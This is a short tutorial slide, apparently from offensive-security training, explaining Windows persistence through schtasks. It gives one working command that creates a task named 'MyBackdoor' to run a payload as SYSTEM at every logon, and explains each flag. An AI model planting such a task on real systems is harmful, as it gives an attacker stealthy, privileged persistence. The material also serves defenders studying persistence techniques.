Automated Tasks with schtasks

Creating event-driven or time-based payload execution.

How schtasks Works

  • Command-line utility to manage scheduled tasks.
  • Tasks can be triggered by time, system startup, or specific events (e.g., user logon).
  • Allows specifying the user context (e.g., SYSTEM privileges).
  • Provides a robust and often stealthy persistence mechanism.

Example Scenario

You create a scheduled task named "MyBackdoor" that executes your payload on user logon with SYSTEM privileges. This ensures your backdoor runs with high privileges every time any user logs in.

Key Takeaway

Scheduled Tasks via schtasks offer a versatile and powerful way to achieve Windows persistence, enabling event-driven execution with elevated privileges.

Target Machine (Windows)
schtasks /create /tn "MyBackdoor" /tr "C:\Path\To\Your\Payload.exe" /sc ONLOGON /ru SYSTEM /f

Command Breakdown:

  • schtasks /create: Creates a new scheduled task.
  • /tn "MyBackdoor": Specifies the task name.
  • /tr "C:\Path\To\Your\Payload.exe": Specifies the program to run.
  • /sc ONLOGON: Sets the schedule to run on user logon.
  • /ru SYSTEM: Specifies the user account to run the task as (SYSTEM privileges).
  • /f: Forces the creation of the task if it already exists.
